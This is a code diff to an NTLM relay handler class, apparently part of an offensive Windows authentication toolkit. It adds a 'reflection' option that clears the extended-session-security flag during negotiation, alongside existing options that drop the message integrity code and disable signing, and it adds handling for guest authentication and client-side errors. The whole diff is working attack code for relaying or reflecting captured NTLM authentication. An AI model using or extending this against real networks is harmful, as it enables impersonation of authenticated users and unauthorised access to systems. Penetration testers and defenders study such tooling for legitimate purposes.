@@ -28,9 +28,11 @@ class NTLMRelaySettings:
 		self.force_signdisable = False
 		self.dropmic = False
 		self.dropmic2 = False
+		self.reflection = False
 		self.modify_negotiate_cb = None
 		self.modify_challenge_cb = None
 		self.modify_authenticate_cb = None
+		self.guest_allowed = False
 		self.timeout = 20
 
 class NTLMRelayHandler:
@@ -44,9 +46,11 @@ class NTLMRelayHandler:
 		self.force_signdisable = self.settings.force_signdisable
 		self.dropmic = self.settings.dropmic
 		self.dropmic2 = self.settings.dropmic2
+		self.reflection = self.settings.reflection
 		self.modify_negotiate_cb = self.settings.modify_negotiate_cb
 		self.modify_challenge_cb = self.settings.modify_challenge_cb
 		self.modify_authenticate_cb = self.settings.modify_authenticate_cb
+		self.guest_allowed = self.settings.guest_allowed
 
 		self.flags = None
 		self.challenge = None
@@ -85,6 +89,7 @@ class NTLMRelayHandler:
 		self.challenge_evt = asyncio.Event()
 		self.authenticate_evt = asyncio.Event()
 		self.start_client_evt = asyncio.Event()
+		self.client_side_exception = None
 
 	def is_guest(self):
 		return False
@@ -192,7 +197,6 @@ class NTLMRelayHandler:
 			self.authenticate_evt.set()
 		if self.start_client_evt is not None:
 			self.start_client_evt.set()
-
 	
 	async def modify_negotiate(self):
 		"""
@@ -229,6 +233,10 @@ class NTLMRelayHandler:
 				self.ntlmNegotiate.NegotiateFlags &= ~ NegotiateFlags.NEGOTIATE_ALWAYS_SIGN
 				self.ntlmNegotiate.NegotiateFlags &= ~ NegotiateFlags.NEGOTIATE_SIGN
 			
+			elif self.reflection is True:
+				await self.log_async(logging.DEBUG, '[NEGOTIATE] Reflection. Disabling extended security.')
+				self.ntlmNegotiate = self.ntlmNegotiate_server
+				self.ntlmNegotiate.NegotiateFlags &= ~ NegotiateFlags.NEGOTIATE_EXTENDED_SESSIONSECURITY
 			else:
 				await self.log_async(logging.DEBUG, '[NEGOTIATE] NO MODS')
 				self.ntlmNegotiate = self.ntlmNegotiate_server
@@ -378,14 +386,14 @@ class NTLMRelayHandler:
 				await self.spnego_obj.notify_relay('NTLM') # notify the client that we're ready to relay
 				await asyncio.wait_for(self.challenge_evt.wait(), self.settings.timeout)
 				await self.log_async(logging.DEBUG, '[SRV] Challenge in!')
-				return self.ntlmChallenge_server_raw, True, None
+				return self.ntlmChallenge_server_raw, True, self.client_side_exception
 			
 			else:
 				self.ntlmAuthenticate_server_raw = authdata
 				self.ntlmAuthenticate_server = NTLMAuthenticate.from_bytes(authdata, True)				
 				self.authenticate_evt.set()
 				await self.log_async(logging.DEBUG, '[SRV] Authenticate event: set')
-				return None, True, None
+				return None, False, self.client_side_exception
 		
 		except Exception as e:
 			return None, False, e
@@ -416,6 +424,7 @@ class NTLMRelayHandler:
 				
 			else:
 				await self.log_async(logging.DEBUG, '[CLI] Challenge data obtained')
+				self.iteration_cnt += 1
 				self.ntlmChallenge_raw = authData
 				self.ntlmChallenge = NTLMChallenge.from_bytes(authData)
 				await self.log_async(logging.DEBUG, '[CLI] Challenge %s' % self.ntlmChallenge)
@@ -432,12 +441,15 @@ class NTLMRelayHandler:
 				if err is not None:
 					raise err
 				await self.log_async(logging.DEBUG, '[CLI] Authenticate event triggered!')
-				if self.ntlmAuthenticate.UserName == '':
+				if self.ntlmAuthenticate.UserName == '' and self.guest_allowed is False:
+					self.client_side_exception = Exception('Guest auth!')
 					return None, False, Exception('Guest auth!')
 
 				return self.ntlmAuthenticate_raw, False, None
 		except Exception as e:
 			traceback.print_exc()
+			self.client_side_exception = e
+			await self.terminate()
 			return None, False, e
 				
 def ntlmrelay_factory(ntlm_settings_factory: Callable = None) -> NTLMRelayHandler:
